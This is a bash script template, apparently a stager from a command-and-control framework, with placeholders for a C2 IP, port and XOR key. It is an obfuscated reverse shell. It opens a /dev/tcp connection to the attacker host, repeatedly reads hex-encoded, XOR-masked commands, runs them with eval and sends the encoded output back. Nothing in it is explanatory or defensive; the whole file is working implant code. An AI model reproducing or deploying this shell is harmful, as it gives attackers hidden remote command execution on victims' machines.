a="@KEY@";
b="@C2_IP@";
c="@C2_PORT@";

_s_to_h() {
    local in=${1:-""};
    local out;
    for ((i=0;i<${#in};i++)); do
        chr=${in:i:1};
        out+=$(builtin printf "%02x" "'${chr}");
    done;
    builtin echo -n "$out";
};

_h_to_s() {
    local in=${1:-""};
    local out;
    for ((i=0;i<${#in};i=i+2)); do
        hex=${in:i:2};
        out+=$(builtin printf "\x$hex");
    done;
    builtin echo -n "$out";
};

_x() {
    local in=$1;
    local out;
    local key="$a";
    for ((i=0;i<${#in};i=i+${#key})); do
        x="${in:i:${#key}}";
        if [ ${#x} -lt ${#key} ]; then
            y="${key:0:${#x}}";
        else
            y="$key";
        fi;
        z=$(builtin printf '%02x' "$((0x$x^0x$y))");
        out+="$z";
    done;
    builtin printf '%s\n' "$out";
};

exec 69<>/dev/tcp/$b/$c;
while true; do
    read -r -u 69 m_e;
    m_d=$(_x "$m_e");
    m_s=$(_h_to_s "$m_d");
    o_s=$(eval "$m_s" 2>&1);
    o_h=$(_s_to_h "$o_s");
    o_e=$(_x "$o_h");
    builtin echo "$o_e" >&69;
done;